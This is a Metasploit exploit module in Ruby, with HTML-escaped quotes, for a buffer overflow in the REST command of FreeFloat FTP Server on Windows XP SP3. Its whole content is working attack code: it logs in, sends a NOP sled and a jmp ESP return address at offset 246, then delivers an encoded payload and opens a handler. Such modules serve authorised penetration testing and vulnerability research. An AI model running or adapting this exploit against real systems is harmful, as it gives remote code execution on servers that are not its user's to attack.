  
require &#039;msf/core&#039;
  
class Metasploit3 < Msf::Exploit::Remote
    Rank = AverageRanking
  
    include Msf::Exploit::Remote::Ftp
  
    def initialize(info = {})
        super(update_info(info,
            &#039;Name&#039;           => &#039;FreeFloat FTP Server REST Buffer Overflow&#039;,
            &#039;Description&#039;    => %q{
                        This module exploits a FreeFloat FTP Server Buffer Overflow
                        found in the REST command.
            },
            &#039;Author&#039;         => [
                        &#039;C4SS!0 G0M3S&#039;,     # Discovery Vuln.
                        &#039;KaHPeSeSe&#039;         # Metasploit Module
                    ],
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Version&#039;        => &#039;$Revision: $&#039;,
            &#039;References&#039;     =>
                [
                    [ &#039;URL&#039;, &#039;http://www.exploit-db.com/exploits/17546&#039; ],
                ],
            &#039;DefaultOptions&#039; =>
                {
                    &#039;EXITFUNC&#039; => &#039;process&#039;,
                },
            &#039;Payload&#039;        =>
                {
                    &#039;BadChars&#039; => "\x00\x0a\x0d",
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;PERFECT XP PC1 / SP3&#039;,
                        {
                            &#039;Ret&#039; => 0x7C874413, # findjmp KERNEL32.DLL ESP 0x7C874413 jmp ESP
                            &#039;Offset&#039; => 246
                        }
                    ],
                ],
            &#039;DisclosureDate&#039; => &#039;Jul 18 2011&#039;,
            &#039;DefaultTarget&#039; => 0))
    end
  
    def exploit
        connect_login
  
        print_status("Trying target #{target.name}...")
  
        buf = make_nops(target[&#039;Offset&#039;]) + [target.ret].pack(&#039;V&#039;)
        buf << make_nops(20)
        buf << payload.encoded
  
        send_cmd( [&#039;REST&#039;, buf] , false )
  
        handler
        disconnect
    end
  
end



